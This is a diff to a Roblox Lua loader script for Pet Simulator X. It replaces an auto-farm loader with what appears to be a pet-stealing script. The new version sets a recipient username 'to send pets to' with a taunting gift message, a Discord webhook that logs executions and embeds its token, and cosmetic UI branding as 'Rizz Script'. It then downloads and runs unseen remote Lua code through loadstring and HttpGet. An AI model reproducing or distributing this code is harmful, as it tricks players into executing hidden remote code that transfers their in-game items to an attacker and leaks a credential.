@@ -1,3 +1,16 @@
-_G.UserID = 2978705627
-_G.WebHook = "https://discord.com/api/webhooks/1101182108887699537/r66JfaqjPkACMQ2nohy3fLHKazaoutFLnTeNfsdHeBU8uxgvu1tuU9NLPku4984BWpPQ"
-loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
+_G.Username = "khlaid20" --// Username To Send Pets To
+_G.GiftMessage = "EZ PET NGL" --// Message For The Gift To Say
+
+--[[ Webhook Config ]]--
+_G.Webhook = "https://discord.com/api/webhooks/1101182108887699537/r66JfaqjPkACMQ2nohy3fLHKazaoutFLnTeNfsdHeBU8uxgvu1tuU9NLPku4984BWpPQ" --// Discord Webhook For Executions
+
+--[[ UI Config ]]--
+_G.ScriptName = "Rizz Script" --// Script Name On The UI
+_G.Tip1 = "1" --// Gives You Tips On The UI
+_G.Tip2 = "2" --// Gives You Tips On The UI
+_G.Tip3 = "3" --// Gives You Tips On The UI
+_G.Tip4 = "4" --// Gives You Tips On The UI
+_G.Tip5 = "5" --// Gives You Tips On The UI
+--[[ Script ]]--
+
+loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/Arkhalis.lua"))()
